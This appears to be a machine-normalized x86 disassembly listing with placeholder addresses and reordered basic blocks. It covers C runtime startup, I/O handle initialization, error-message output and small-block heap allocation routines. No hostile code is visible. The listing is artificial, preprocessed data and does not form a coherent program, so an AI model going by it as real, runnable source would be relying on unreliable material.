push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_407d6e
pop ecx
mov [ esp + 0x10 ] ebx
sub_40aa89
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_408ba8
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_407d25
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x8
add eax 0x100
jmp r-xdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] esi
jge r-xdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor edi edi
test esi esi
jle r-xdata
mov edi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
add [ rw-data ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne r-xdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl r-xdata
mov cl [ ebp ]
test cl 0x1
je r-xdata
add edi 0x4
cmp [ rw-data ] esi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test cl 0x8
jne r-xdata
push 0x100
call sub_408ba8
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_40ac34
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_40aedc
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_40ac70
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_4071b6
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_407174
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_4071b6
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_40724a
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_40ad50
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40ad89
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_40ad89
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40ad89
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_407ea0
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_407ea0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_40ba20
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40ba20
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_40ba30
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40ba30
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_40ba30
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40ce79
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_407ea0
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_40c5f0
add esp 0x10
sub_40aedc
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_40af1a
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_40af45
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_407270
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_40b270
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_40b62a
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40b579
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40b579
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_40b62a
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_40b725
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
